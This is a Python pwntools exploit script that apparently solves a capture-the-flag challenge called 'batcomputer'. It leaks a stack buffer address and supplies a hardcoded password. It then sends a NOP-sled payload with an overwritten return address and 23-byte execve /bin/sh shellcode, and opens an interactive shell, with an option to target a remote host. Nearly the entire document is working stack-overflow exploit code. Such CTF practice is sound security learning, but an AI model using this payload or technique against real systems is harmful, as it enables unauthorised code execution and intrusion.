#!/usr/bin/env python3

from pwn import *

e = ELF("./batcomputer_patched")
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        # The debugging location is found via going through the __libc_start_main
        # And we have to use set breakpoing pending on because the libc is loaded later.
        # This is needed because the binary is stripped.
        r = gdb.debug([e.path], '''
                      set breakpoint pending on
                      b __libc_start_call_main
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.GDB_ATTACH:
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(main)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # Simply BF + shellcode on stack.
    # One thing to note is that the shellcode must be after the return address otherwise the shellcode's stack operations will overwrite its own code.

    r.sendlineafter(b'>', b'1')
    data = r.recvline()
    buff_addr_str = data.split()[-1]
    buff_addr = int(buff_addr_str, 16)
    info(f'buff is at {hex(buff_addr)}')
    r.sendlineafter(b'>', b'2')
    r.sendlineafter(b'Enter the password:', b'b4tp@$$w0rd!')
    # shellcode = asm(shellcraft.sh()) # This generates a 48-byte shellcode which is too big.
    # Found the following 23-byte one from https://www.exploit-db.com/exploits/46907
    shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
    info(f'shellcode has {len(shellcode)} bytes')
    payload = flat(
            b'\x90' * 84,
            buff_addr + 84 + 8,
            shellcode,
            )
    r.sendlineafter(b'commands:', payload)
    r.sendlineafter(b'>', b'3')  # Trigger the loop exit

    r.interactive()

if __name__ == "__main__":
    main()
